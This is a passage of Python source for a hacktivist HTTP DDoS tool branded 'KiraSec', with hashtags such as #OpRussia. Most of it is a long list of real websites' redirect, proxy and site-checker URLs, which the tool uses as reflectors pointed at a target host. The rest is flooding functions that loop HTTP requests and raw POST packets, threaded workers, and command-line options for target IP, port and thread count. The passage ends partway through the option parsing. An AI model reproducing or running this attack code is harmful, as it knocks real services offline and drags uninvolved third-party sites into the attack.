    bots.append("http://pms.shinsaegye.com/bbs/login.php?url=/login.php?URL=")
    bots.append("https://www.vik-ruse.com/Index.aspx?PageUrl=")
    bots.append("https://www.scoalaintuitext.ro/pagina-copiilorpagina=")
    bots.append("http://www.promymall.co.kr/member/login.php?url=/login.php?URL=")
    bots.append("https://www.clubopel.com/login.php?redirect=")
    bots.append("https://mytopfiles.com/search.php?ss='''tube/buy.php?category=bol-chat.de/proxy.php?urlproxy.php?url=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainredirect=")
    bots.append("https://www.manacomputers.com/redirect.php?blog=")
    bots.append("https://www.manacomputers.com/redirect.php?blog=")
    bots.append("https://members.notesdirect.com/login.html?backto=Lw==backTo=")
    bots.append("https://twitter.com/universityofriuri=")
    bots.append("http://burgman-club.ru/forum/away.php?s=")
    bots.append("http://webmail.pa.net/imp/login.php?url=/imp/mailbox.php?mailbox=INBOXlogin.php?URL=")
    bots.append("http://doc-erp.com/bbs/login.php?url=/index.phplogin.php?URL=")
    bots.append("https://www.reddit.com/r/dankmemes/comments/g502sk/if_you_translate_u_r_a_nerd/translate?u=")
    bots.append("https://www.reddit.com/r/funny/comments/g50447/if_you_translate_u_r_a_nerd/translate?u=")
    bots.append("https://www.tsubakiadvantage.com/members/login/?redir=/login?redir=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainlogin?redirect=")
    bots.append("https://twitter.com/actioncoasteraction=")
    bots.append("https://ilsship.rocksolidinternet.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("https://olyparks.perfpro-hrnonline.com/logout.php?redirect=")
    bots.append("https://www.prostarparcel.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("https://englandship.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("http://minima.quality-steinhoff.com/user.php?xoops_redirect=")
    bots.append("https://www.asternic.net/demo/logout.php?redirect=")
    bots.append("https://twitter.com/uk_domain_namesdomain=")
    bots.append("http://www.kksjim.info/user.php?xoops_redirect=")
    bots.append("https://www.abcmouse.com/html5/color/paintbynumber?imgurl=")
    bots.append("https://twitter.com/indyfromspacefrom=")
    bots.append("http://www.verenaoji.com/user.php?xoops_redirect=")
    bots.append("https://prod.kleeissuetracker.com/login_page.php?return=")
    bots.append("http://www.metvuw.com/forecast/forecast.php?type=")
    bots.append("http://metvuw.com/forecast/forecast.php?type=")
    bots.append("http://darmarit.de/http://validator.w3.org/checklink?uri=")
    bots.append("http://prod.kleeissuetracker.com/login_page.php?return=")
    bots.append(
        "https://mytopfiles.com/search.php?bu=1&amp;ss='''tube/buy.php?category=validator.w3.org/checklink?uri=")
    bots.append("https://www.java67.com/2013/01/difference-between-url-uri-and-urn.htmluri=")
    bots.append("https://www.htcdev.com/?URL=ipcraft.pro/forum/away.php?s=")
    bots.append("http://www.acehints.com/2011/12/google-language-translator-gadget-html.htmltranslate?u=")
    bots.append("https://mytopfiles.com/search.php?ss='''tube/buy.php?category=bol-chat.de/proxy.php?urlproxy.php?url=")
    bots.append("https://twitter.com/hashtag/backto2011backTo=")
    bots.append("https://portal.rjobrien.com/Account/Login?ReturnUrl=https://trade.rjobrien.com/portal/weboe/login?r=")
    bots.append("https://www.regaldrapes.com/loginToRD.aspx?redir_url=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainredirect/")
    bots.append(
        "https://www.eaa.org/apps/chapters/admin/popupchapter.aspx?textbox1=ChapterName&amp;textbox2=ChapterKeyID&amp;pageUrl=ChapterEventInsurancepageurl=")
    bots.append("https://disaster.salvationarmyusa.org/ISC/Intro/login.php?url=login.php?URL=")
    bots.append(
        "http://empleados.ibermansa.com:8080/grupo0/espanol/login_manager.jsp?_URL=servlet/CheckSecurity/JSP/grupo4/grupo4_pantalla1.jsp?estado=41manager.jsp?url=")
    bots.append("https://sbase.scheidt-bachmann.de/login.php?url=/&amp;nocookies=truelogin.php?URL=")
    bots.append(
        "https://www.eaa.org/apps/chapters/admin/popupchapter.aspx?textbox1=ChapterName&amp;textbox2=ChapterKeyID&amp;pageUrl=ChapterEventInsurancePageUrl=")
    bots.append("http://kinoradiomagia.tv/forum/away.php?s=")
    bots.append("http://rutracker.org/forum/login.php?redirect=")
    bots.append("https://www.rohstoff-welt.de/goto.php?url=")
    bots.append("https://twitter.com/AgeSxLocationlocation=")
    bots.append("https://login.icuserver.com/login.php?redirect=")
    bots.append("https://www.d-o-o.de/login.php?redirect=")
    bots.append("http://mantis.trakt.ru/login_page.php?return=")
    bots.append("https://it.gennet.ee/mantis/login_page.php?return=")
    bots.append("http://mbt.cmedia.com.tw/mantisbt/login_page.php?return=")
    bots.append("https://members.eliteleadseliteadvisors.com/index.php?location=")
    bots.append("https://www.fanclub.co.jp/k_asai/user.php?xoops_redirect=")
    bots.append("https://crd.ndl.go.jp/reference/user.php?xoops_redirect=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainredirect=")
    bots.append("https://www.manacomputers.com/redirect.php?blog=")
    bots.append("http://burgman-club.ru/forum/away.php?s=")
    bots.append("https://members.notesdirect.com/login.html?backto=Lw==backTo=")
    bots.append("https://twitter.com/universityofriuri=")
    bots.append("https://www.reddit.com/r/dankmemes/comments/g502sk/if_you_translate_u_r_a_nerd/translate?u=")
    bots.append("http://webmail.pa.net/imp/login.php?url=/imp/mailbox.php?mailbox=INBOXlogin.php?URL=")
    bots.append("https://www.reddit.com/r/funny/comments/g50447/if_you_translate_u_r_a_nerd/translate?u=")
    bots.append("http://doc-erp.com/bbs/login.php?url=/index.phplogin.php?URL=")
    bots.append("https://www.tsubakiadvantage.com/members/login/?redir=/login?redir=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainlogin?redirect=")
    bots.append("https://twitter.com/actioncoasteraction=")
    bots.append("https://ilsship.rocksolidinternet.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("https://www.prostarparcel.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("https://olyparks.perfpro-hrnonline.com/logout.php?redirect=")
    bots.append("https://englandship.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("http://minima.quality-steinhoff.com/user.php?xoops_redirect=")
    bots.append("https://www.asternic.net/demo/logout.php?redirect=")
    bots.append("http://www.verenaoji.com/user.php?xoops_redirect=")
    bots.append("https://gtmetrix.com/analyze.html;$POST;url")
    bots.append("https://isitdown.co.uk/check/;$POST;domainname")
    bots.append("https://www.site24x7.com/check-website-availability.html;$POST;url")
    bots.append("https://nibbler.silktide.com/en_US/report/submit;$POST;url")
    bots.append("https://checkwebsiteonline.com/domain;$POST;url")
    bots.append("https://websitechecker.online/test_url;$POST;url")
    bots.append("https://isitdown.co.uk/check/;$POST;domainname")
    bots.append("https://wheresitup.com/demo/results;$POST;url")
    bots.append("https://sitedown.co/views/ajax;$POST;title")
    bots.append("https://onlinenoffline.com/tool/check-domain/result;$POST;domain_query")
    bots.append(
        "https://jigsaw.w3.org/css-validator/validator?uri=$TARGET&profile=css3&usermedium=all&vextwarning=true")
    bots.append("https://www.openadmintools.com/en/$TARGET")
    bots.append("http://www.htmlhelp.com/cgi-bin/validate.cgi?url=$TARGET&warnings=yes&spider=yes")
    bots.append("https://www.rssboard.org/rss-validator/check.cgi?url=")
    bots.append("http://www1.kumagaku.ac.jp/cgi-bin/i/check.cgi?url=")
    bots.append("http://feedvalidator.org/check.cgi?url=")
    bots.append("http://www.feedvalidator.org/check.cgi?url=")
    bots.append(
        "https://attone.my.salesforce.com/loginflow/lightningLoginFlow.apexp?retURL=/articles/Knowledge/AT-T-Internet-Service-Comparisons-AT-T-Retail-AR&amp;sparkID=RetailStoreLoginreturl=")
    bots.append(
        "https://www.nikonimgsupport.com/ni/locale_setting?kyoten=NI&amp;retURL=/apex/NI_article?articleNo=000002351&lang=en_USreturl=")
    bots.append(
        "https://xyzimpactplastics.lightning.force.com/lightning/setup/ManageUsers/page?address=/005?isUserEntityOverride=1&retURL=%2Fsetup%2Fhome&appLayout=setup&tour=&sfdcIFrameOrigin=")
    bots.append(
        "https%3A%2F%2Fxyzimpactplastics.lightning.force.com&sfdcIFrameHost=web&nonce=c76746c0957aef988135bfdb091735d2926e605cd47ad0faa0a7e1c068b96f6c&ltn_app_id=06m2E000001axIqQAI&clc=1returl=")
    bots.append("http://member.pinyou.tw/?returl=")
    bots.append(
        "https://community.f5.com/t5/technical-forum/need-to-redirect-uri-to-uri-or-url-to-url-in-an-irule-for-hosted/m-p/83872redirect_uri/")
    bots.append("https://www.googlecloudcommunity.com/gc/Apigee/redirect-uri/m-p/47229redirect_uri/")
    bots.append("https://community.f5.com/t5/technical-forum/")
    bots.append("https-redirect-uri-to-uri/td-p/145680redirect_uri/")
    bots.append(
        "https://community.atlassian.com/t5/Sourcetree-questions/Invalid-redirect-uri/qaq-p/1100055redirect_uri/ ")
    bots.append(
        "https://stackoverflow.com/questions/50081566/invalid-client-invalid-redirect-uri-error-when-running-github-pages-applicationredirect_uri/")
    bots.append(
        "https://appleid.apple.com/auth/authorize?client_id=it.myautogrill.applesignin&amp;response_type=code&amp;response_mode=query&amp;redirect_uri=&amp;state=-9223369148862559707redirect_uri/")
    bots.append(
        "https://stackapp.forumming.com/question/16/how-can-i-use-an-ios-custom-url-scheme-as-redirect-uriredirect_uri/")
    bots.append(
        "https:/us.valrhona.com/openid-connect/valrhona_salesforce&amp;state=6VdRLr3PDdbhFbIbzuVfFmqslGX-zmMhF3uoBERorXg&amp;lang=EN&amp;origin=3redirect_uri/")
    bots.append("https://www.googlecloudcommunity.com/gc/Apigee/redirect-uri/m-p/47229redirect_uri=")
    bots.append(
        "https://community.atlassian.com/t5/Sourcetree-questions/Invalid-redirect-uri/qaq-p/1100055redirect_uri=")
    bots.append("https://community.f5.com/t5/technical-forum/")
    bots.append("https-redirect-uri-to-uri/td-p/145680redirect_uri=")
    bots.append(
        "https://community.f5.com/t5/technical-forum/need-to-redirect-uri-to-uri-or-url-to-url-in-an-irule-for-hosted/m-p/83872redirect_uri=")
    bots.append(
        "https://stackapp.forumming.com/question/16/how-can-i-use-an-ios-custom-url-scheme-as-redirect-uriredirect_uri=")
    bots.append(
        "https://appleid.apple.com/auth/authorize?client_id=it.myautogrill.applesignin&amp;response_type=code&amp;response_mode=query&amp;redirect_uri=")
    bots.append(
        "https://blipps.blippar.com/?next=/o/authorize/?client_id=yhrryNEcbr6bHQSDskIpJg5XgotBX25khAEeQroL&response_type=code&redirect_uri=")
    bots.append(
        "https://microsoftedge.microsoft.com/addons/detail/requestly-redirect-url-/ehghoapnlpepjmfbgaomdiilchcjemak?form=m401roredirect_url=")
    bots.append(
        "https://techcommunity.microsoft.com/t5/yammer-developer/invalid-redirect-url-when-using-javascript-sdk-in-cordova-based/td-p/329794redirect_url=")
    bots.append(
        "https://stackoverflow.com/questions/31661044/how-to-redirect-url-pattern-with-variables-from-urls-py-in-django?noredirect=1redirect_url=")
    bots.append("https://community.f5.com/t5/technical-forum/redirect-url-irule/td-p/74213redirect_url=")
    bots.append("https://member.disneymovieclub.go.com/?redirectUrl=redirect_url=")
    bots.append("https://clockify.me/assets/app-redirect.html?redirectUrl=/user/settingsredirect_url=")
    bots.append("https://login.inttra.com/?redirect_url=")
    bots.append(
        "https://stackoverflow.com/questions/60658453/how-can-i-get-an-element-in-a-redirect-url-using-node-jsredirect?url=")
    bots.append(
        "https://microsoftedge.microsoft.com/addons/detail/requestly-redirect-url-/ehghoapnlpepjmfbgaomdiilchcjemak?form=m401roredirect?url=")
    bots.append(
        "https://stackoverflow.com/questions/31661044/how-to-redirect-url-pattern-with-variables-from-urls-py-in-django?noredirect=1redirect?url=")
    bots.append(
        "https://techcommunity.microsoft.com/t5/yammer-developer/invalid-redirect-url-when-using-javascript-sdk-in-cordova-based/td-p/329794redirect?url=")
    bots.append("https://clockify.me/assets/app-redirect.html?redirectUrl=/redirect/1redirect?url=")
    bots.append(
        "https://wp-qa.com/how-to-interfere-htaccess-redirect-url-to-check-if-a-visitor-logged-into-wordpressredirect?url=")
    bots.append("https://login.inttra.com/?redirect_url=aHR0cHM6Ly9zaGlwLmludHRyYS5jb20vIy9zY2hlZHVsZXM=redirect?url=")
    bots.append("https://clockify.me/assets/app-redirect.html?redirectUrl=/user/settingsredirect?url=")
    bots.append("https://www.yunzhijia.com/home/?m=open&amp;a=login&amp;redirectUrl=/yzj-layout/home/redirect?url=")
    bots.append("https://micourt.courts.michigan.gov/case-search/?redirectUrl=/court/D17redirect?url=")
    bots.append("https://stackoverflow.com/questions/41133863/redirect-php-url-with-parametersredirect.php?url=")
    bots.append("https://contest.eastcococonnect.com/redirect.php?url_id=4247211&amp;s_id=19519288redirect.php?url=")
    bots.append("http://maformation.cosformation.fr/manager/error_redirect.php?url=")
    bots.append("https://groupe-jpl.com/manager/error_redirect.php?url=")
    bots.append("https://www.wetter-sanktveit.at/template/pages/station/redirect.php?url=")
    bots.append("https://yarik-sat.info/redirect.php?url=")
    bots.append("https://groupe-afec.cloud-elearning.net/manager/error_redirect.php?url=")
    bots.append("http://www.kinderhotels.com/ssl_redirect.php?url=")
    bots.append("https://www.barcelona.de/redirect.php?url=")
    bots.append("http://www.leadingspa.com/ssl_redirect.php?url=")
    bots.append("https://globalx.magnasteyr.com/globalx-ui/redirecttoguiredirect_to=")
    bots.append("https://community.f5.com/t5/technical-forum/")
    bots.append("https-redirect-to-append-www/td-p/266396redirect_to=")
    bots.append("https://wordpress.com/log-in?redirect_to=")
    bots.append("https://studentaid.gov/fsa-id/sign-in/landing?redirectTo=/app/parentPlusCounseling.actionredirect_to=")
    bots.append("https://jira.nov.com/plugins/servlet/samlsso/redirectToDashboardredirect_to=")
    bots.append("https://www.alconchoice.com/?redirectToBrands=falseredirect_to=")
    bots.append("https://east.nokiantiresrebates.ca/?redirectToBrands=falseredirect_to=")
    bots.append("https://store-sit.isaca.org/RedirectToCartredirect_to=")
    bots.append("https://iqcode.com/code/php/redirect-")
    bots.append("https://thrivemyway.com/glossary/redirect/")
    bots.append("http://firstspot.org:5788/redirect.phpredirect/")
    bots.append("https://www.spotify.com/token-login/?url=/redirect/")
    bots.append("https://starcitizen.tools/Star_Citizen:Redirectredirect/")
    bots.append("https://uhc.procurement.ariba.com/?guidedbuyredirect=trueredirect/")
    bots.append("https://mint.microsoft.com/frameRedirect.htmlredirect/")
    bots.append("https://onedrive.live.com/?sw=redirectredirect/")
    bots.append(
        "https://gitweb.gentoo.org/proj/perl-overlay.git/tree/dev-perl/CGI-Application-Plugin-Redirect/CGI-Application-Plugin-Redirect-1.00.ebuild?id=06f7f230de4f2250f1f93d904bc6b0e2304fe3c3redirect.cgi?")
    bots.append("https://forums.att.com/conversations/data-messaging-features-internet-tethering/")
    bots.append("https://www.ec-prof.com/p/redirect.html?url=")
    bots.append("https://www.egyfoxtech.com/p/redirect.html?url=")
    bots.append("https://moumentec.com/p/redirect.html?url=")
    bots.append("https://www.a-onec.com/p/redirect.html?url=")
    bots.append("https://www.the-techmen.com/p/page-redirect.html?url=")
    bots.append("https://www.teqniawal.com/p/redirect.html?url=")
    bots.append("https://mitsui-shopping-park.com/lalaport/ebina/redirect.html?url=")
    bots.append(
        "https://www.arab4mix.net/p/redirect.html?&amp;&amp;url=_aHR0cHM6Ly9maWxtb3JhLndvbmRlcnNoYXJlLm5ldC9maWxtb3JhLXZpZGVvLWVkaXRvci5odG1sredirect.html?url=")
    bots.append("https://mitsui-shopping-park.com/lalaport/iwata/redirect.html?url=")
    bots.append("http://www.3dbibleproject.com/en/tabernacle/study/redirect.htm?url=")
    bots.append("https://www.shels.com.ua/secure/redirect.htm?url=")
    bots.append("https://www.citibank.co.uk/personal/redirect/redirect.htm?url")
    bots.append("https=secure5.es.arcot.com/vpas/CITIUK_VISA/enroll/index.jspredirect.htm?url=")
    bots.append("https://www.carvision.com/redirect.htm?url=")
    bots.append("http://www.connellchevrolet.com/redirect.htm?url=")
    bots.append("http://www.drenaline.net/redirect.htm?url=")
    bots.append("https://www.reforma.com/libre/acceso/accesofb.htm?urlredirect=/htm3yrredirect.htm?url=")
    bots.append("http://www.3dbibleproject.com/tw/temple/study/redirect.htm?url=")
    bots.append(
        "https://pingoo.jp/redirect.php?blog_id=333271&amp;entry_url=//pingoo.jp/ranking.php?cat_id3=1249redirect.php?blog=")
    bots.append(
        "https://pingoo.jp/redirect.php?blog_id=317717&amp;entry_url=/pingoo.jp/ranking.php?cat_id3=1539redirect.php?blog=")
    bots.append("https://www.dasweinforum.de/redirect.php?Blog=5redirect.php?blog=")
    bots.append(
        "https://pingoo.jp/redirect.php?blog_id=334136&amp;entry_url=//pingoo.jp/ranking.php?cat_id3=1651redirect.php?blog=")
    bots.append("http://pingoo.jp/redirect.php?blog_id=297444&amp;ampredirect.php?blog=")
    bots.append("https://www.xnxxsexporn.net/search/")
    bots.append("https-www-xstars-co-tara-pink-porn-videos.phpredirect.php?blog=")
    bots.append("https://www.xnxxsexporn.net/search/")
    bots.append("https-www-xstars-co-elena-guzman-porn-videos.phpredirect.php?blog=")
    bots.append("https://www.xnxxsexporn.net/search/")
    bots.append("https-www-xstars-co-vera-cruz-porn-videos.phpredirect.php?blog=")
    bots.append("http://blogranking.fugal-104.jp/redirect.php?blog_id=redirect.php?blog=")
    bots.append("https://skadden.webex.com/media/redir/index.htmlredir=")
    bots.append(
        "https://skydrive.live.com/redir.aspx?cid=643e45823a35c6a3&amp;resid=643E45823A35C6A3!202&amp;parid=rootredir=")
    bots.append("https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/html_redir.bgredir=")
    bots.append(
        "https://cpp.hotexamples.com/examples/-/-/show_redir_state/cpp-show_redir_state-function-examples.htmlredir=")
    bots.append("https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/html_redir.yhqxredir=")
    bots.append(
        "https://onedrive.live.com/redir?resid=DA08716EA0F69FB4!711&amp;authkey=!AMXrSbmKF58_c7M&amp;ithint=file,pdfredir=")
    bots.append("https://www.lololyrics.com/user/Redirredir=")
    bots.append("https://www.linguee.fr/anglais-francais/traduction/redir.htmlredir=")
    bots.append("https://levanteadvice.com/login?redir_url=")
    bots.append("https://www.worksnaps.net/www/login.php?redir_url=")
    bots.append(
        "https://sas.denso-ten.com/dana-na/setup/psaldownload.cgi?b=/dana/home/index.cgi&amp;c=/dana/nc/ncrun.cgi?launch_nc=1&redir_url=")
    bots.append(
        "https://www.gov.br/receitafederal&.redir-url-test/pt-br/assuntos/aduana-e-comercio-exterior/manuais/admissao-temporaria/topicos/suspensao-total-do-pagamento-de-tributos/descumprimento/descumprimento-do-regime-de-admissao-temporaria-fluxograma.pdfredir_url=")
    bots.append(
        "https://www.gov.br/receitafederal&.redir-url-test/pt-br/assuntos/aduana-e-comercio-exterior/manuais/transito-aduaneiro/topicos/procedimentos-na-unidade-de-origem/conferenciaredir_url=")
    bots.append(
        "https://www.bdb.at/reDir/?url=/Download/preisliste/pdf/146879_Preisliste-Schöck-2021.pdf&amp;l1=SWARTKLICK_146879&amp;l2=pdfredir_url=")
    bots.append("https://pjfc.papajohns.com/dana/nc/ncrun.cgi?launch_nc=1&amp;redir_url=")
    bots.append(
        "https://madflesh.com/redir?url=dae6O://6Yl.2Jqf.FRo/U4QE6e/tuzIAx3/2vVV8n-k5IXTLC0-ZDA-nj-Pn1-T99-0hC1T-0WF-dT-HBcL-bEE-JODN6y/?03NQ5=ut0Ip&amp;aff=58redir_url=")
    bots.append(
        "https://ctabwiki.nerrog.net/?plugin=redir&amp;url=aHR0cHM6Ly9zbWFydGFzdy5jb20vYXJjaGl2ZXMvMTc3NDAzMTAuaHRtbA=redir_url=")
    bots.append("https://github.com/moodle/moodle/blob/master/user/action_redir.phpredir.php? ")
    bots.append(
        "https://git.moodle.org/gw?p=integration.git;a=blame;f=user/action_redir.php;h=72eb3057391724b5872b6ae2a2ebd65c44e4d33c;hb=71d61a7c8cb11db43f305adc4fb4bced9a0620adredir.php? ")
    bots.append(
        "https://git.moodle.org/gw?p=integration.git;a=blame;f=user/action_redir.php;h=2401cec5139a5730d13ca5bfec9c41fa3d4bd11e;hb=0a1a56307b9c4e932dc2ab7948f25b38be2024a0redir.php? ")
    bots.append("https://moodle.telt.unsw.edu.au/user/action_redir.phpredir.php? ")
    bots.append("https://woerterbuch.reverso.net/franzosisch-deutsch/redir+phpredir.php? ")
    bots.append("https://osdn.net/frs/redir.php? ")
    bots.append("http://www.psych.zju.edu.cn/redir.php? ")
    bots.append("http://grs.zju.edu.cn/redir.php? ")
    bots.append("http://grs.zju.edu.cn/yjszs/redir.php? ")
    bots.append("http://basket.idnes.cz/redir.aspx?url=")
    bots.append("httpredir.aspx?Url=")
    bots.append("https://www.debexams.ie/redir.aspx?url=/need-help/deb-timetable.aspx&amp;zone=Teacherredir.aspx?Url=")
    bots.append(
        "https://ww5.contents-web.com/jlibrary/log_redir.aspx?url=learning-column2/s-column-or-01.html&amp;cat=1126redir.aspx?Url=")
    bots.append("https-www-artatel-com-1.searchredir.aspx?Url=")
    bots.append(
        "http://www.recordsforliving.com/Shared/Redir.aspx?URL=/HealthFrame/HealthFrameFamilyEdition/HealthFrame_FamilyEdition_Help.pdfredir.aspx?Url=")
    bots.append(
        "http://www.recordsforliving.com/Shared/Redir.aspx?URL=/OpenHealthServices/Design+Overview.pdfredir.aspx?Url=")
    bots.append(
        "https://ww5.contents-web.com/jlibrary/log_redir.aspx?url=learning-column2/j-column-vm-01.html&amp;cat=1008redir.aspx?URL=")
    bots.append("http://basket.idnes.cz/redir.aspx?url=")
    bots.append("httpredir.aspx?URL=")
    bots.append("https://www.debexams.ie/redir.aspx?url=/need-help/deb-timetable.aspx&amp;zone=Teacherredir.aspx?URL=")
    bots.append("https-www-artatel-com-1.searchredir.aspx?URL=")
    bots.append(
        "http://www.recordsforliving.com/Shared/Redir.aspx?URL=/HealthFrame/HealthFrameFamilyEdition/HealthFrame_FamilyEdition_Help.pdfredir.aspx?URL=")
    bots.append(
        "http://www.recordsforliving.com/Shared/Redir.aspx?URL=/OpenHealthServices/Design+Overview.pdfredir.aspx?URL=")
    bots.append("https://support.google.com/google-ads/answer/2382957/referrer-url?hl=en-GBreferrer/ ")
    bots.append("https://github.com/ChrisWong979/url-referrer-in-asp-net-corereferrer/ ")
    bots.append("https://www.experts-exchange.com/questions/27685036/Redirect-based-on-referrer.htmlreferrer/ ")
    bots.append("https://developer.android.com/google/play/installreferrer/ ")
    bots.append("https://never.referrer-policy.info/referrer/ ")
    bots.append("https://www.canva.com/brand/join?amp;referrer=team-invitereferrer/ ")
    bots.append("https://de.comp.security.misc.narkive.com/sYjNsSYP/referrer-unterdruckenreferrer/ ")
    bots.append("https://de.helpr.me/9322-what-is-install-referrer-apireferrer/ ")
    bots.append(
        "https://docs.microsoft.com/en-us/dotnet/api/microsoft.sharepoint.publishing.internal.transformationstatestore.pageurlpageurl=")
    bots.append("https://docs.microsoft.com/ru-ru/sharepoint/dev/schema/pageurl-element-viewpageurl=")
    bots.append(
        "https://experienceleague.adobe.com/docs/analytics/implementation/vars/page-vars/pageurl.html?lang=svpageurl=")
    bots.append("https://stackoverflow.com/tags/wagtail-pageurl/infopageurl=")
    bots.append("http://kng999.com/?pageUrl=money&amp;pageType=chargepageurl=")
    bots.append("https://www.unilever.com/?pageURLpageurl=")
    bots.append(
        "https://epermits.pme.gov.sa/ETransactionsAPP/Main.jsf?pageURL=/Env/Common/ApplicantRequests.jsppageurl=")
    bots.append("http://sgzw.hncwgk.com/newlist.asp?gid=4&amp;pageurl=")
    bots.append("http://www.sayclub.com/global/loginform.nwz?pageurl=")
    bots.append("http://dmzhsms2.lge.com/common/forward?pageUrl=common/CommonSessionExpiredpageurl=")
    bots.append(
        "https://social.msdn.microsoft.com/Forums/windowsserver/en-US/e6214a80-7875-4ac8-af29-43f16ba672a6/how-to-use-return-urlreturn_url=")
    bots.append(
        "https://social.msdn.microsoft.com/Forums/windowsserver/en-US/4339b04a-ef4f-4704-ae53-3403f113be81/return-urlreturn_url=")
    bots.append("https://support.tipsandtricks-hq.com/forums/topic/estore-return-url-doesnt-workreturn_url=")
    bots.append(
        "https://support.tipsandtricks-hq.com/forums/topic/wp-affiliate-sales-not-recorded-issue-with-return-urlreturn_url=")
    bots.append("https://www.hospitalitysupport.org/property/268102?return_url=")
    bots.append("https://www.yumbles.com/seller.php?dispatch=auth.login_form&amp;return_url=")
    bots.append("https://medpros.mods.army.mil/MWDENet/OAuthLogin.aspx?LocalReturnUrl=login.aspxreturn_url=")
    bots.append("https://ca.iqos.com/backend.php?dispatch=auth.login_form&amp;return_url=")
    bots.append("https://ebase2go.lufthansa.com/go=")
    bots.append("http://www.go.com.mt/go=")
    bots.append("https://global.gotomeeting.com/go=")
    bots.append("https://search.twitter.com/?gogo=")
    bots.append("http://go.worldspan.com/go=")
    bots.append("https://www.igonavigation.com/support/igo-navigation-app/go=")
    bots.append("https://www.cov19.mhlw.go.jp/go=")
    bots.append("https://integration.gofrugal.com/go=")
    bots.append("http://www.mofat.go.kr/go=")
    bots.append("https://go.goodyear.com/cfmx/internal/gaims/index.cfmgo=")
    bots.append("https://englishtips.org/engine/go.php?url=")
    bots.append("https://www.423down.com/go.php?url=")
    bots.append("http://www.doodoo.ru/engine/go.php?url=")
    bots.append("https://www.babyuser.org/engine/go.php?url=")
    bots.append(
        "http-3a-2f-2fwww-offshore-mag-com-2farticles-2fprint-2fvolume-61-2fissue-2-2fnews-2fwest-africa-dgp/go.php?url=")
    bots.append(
        "http-3a-2f-2fwww-offshore-mag-com-2farticles-2fprint-2fvolume-61-2fissue-2-2fnews-2fwest-africa-dgp/go.php?url=")
    bots.append("https://www.abdoutech.org/p/go.html?url=")
    bots.append("http://www.chfybjy.com/go.html?url=")
    bots.append("https://shortdzl.blogspot.com/p/go.html?url=")
    bots.append("https://topintro-ads.blogspot.com/p/go.html?url=")
    bots.append("https://www.ikhsanstuy.com/p/go.html?url=")
    bots.append("https://www.ncfnet.cn/go.html?url=")
    bots.append("https://www.sameh.tech/p/go.html?url=")
    bots.append("http://www.scgjgs.com/go.html?url=")
    bots.append("https://www.goto.com/resources/resolvegoto=")
    bots.append("https://app.goto.com/landinggoto=")
    bots.append("https://github.com/roctbb/GoTogoto=")
    bots.append("https://yard.onl/sitelycee/cours/c/goto.htmlgoto=")
    bots.append("https://bfscripts.dhnet.be/goto/?langid=171&amp;idaffiliation=349374&amp;LineID=R944005333goto=")
    bots.append("https://goto.sutterhealth.org/goto=")
    bots.append("https://github.com/kana-goto/goto=")
    bots.append("https://www.researchgate.net/profile/Goto-Kentogoto=")
    bots.append("https://docs.microsoft.com/en-us/dotnet/api/appkit.nsapplication.openfileopenfile=")
    bots.append("https://docs.microsoft.com/en-us/dotnet/api/appkit.nsapplicationdelegate.openfileopenfile=")
    bots.append("https://github.com/skloczi/openfileopenfile=")
    bots.append("https://www.synactive.com/docu_f/doc_openfile.htmlopenfile=")
    bots.append("https://www.openfile.me/allopenfile=")
    bots.append("https://github.com/topics/openfileopenfile=")
    bots.append("https://www.cadaplus.com/help/openfile.php?lang=plopenfile=")
    bots.append("https://gitee.com/openfileopenfile=")
    bots.append("https://openfile-studio.updatestar.com/openfile=")
    bots.append("https://newpaste.xyz/openfile/openfile=")

    return (bots)


def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            print("\033[94m KiraSec DOS is Loading\033[0m")
            time.sleep(.1)
    except:
        time.sleep(.1)


def down_it(item):
    try:
        while True:
            packet = str(
                "POST HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
                'utf-8')

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--Packet sent by KiraSec--> \033[0m")
            else:
                s.shutdown(1)
                print("\033[91off shod<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mNo Connection KiraSec is winning\033[0m")
        # print("\033[91m",e,"\033[0m")
        time.sleep(.1)


def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()


def usage():
    print(Fore.BLUE + '''
| |/ (_)_ __ __ _/ ___|  ___  ___
| ' /| | '__/ _` \___ \ / _ \/ __|
| . \| | | | (_| |___) |  __| (__
|_|\_|_|_|  \__,_|____/ \___|\___|
\033[92m   KiraSec Layer 7 HTTP DDoS Tool upgraded by AnonZenn. This is a project by and for team KiraSec

	#OpRussia #OpBelarus #OpPedoHunt 


	usage : python3 KiraSecddos.py  [-s] [-p] [-t]
	-s : Website IP (You can check using https://check-host.net )
	-p : port (use ports 80 and 443)
	-t : turbo (recommended 135 or 443 for a quicker flood)  \033[92m
	==========================================================================================================================''')
    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    global item
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",
                    const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    opts, args = optp.parse_args()
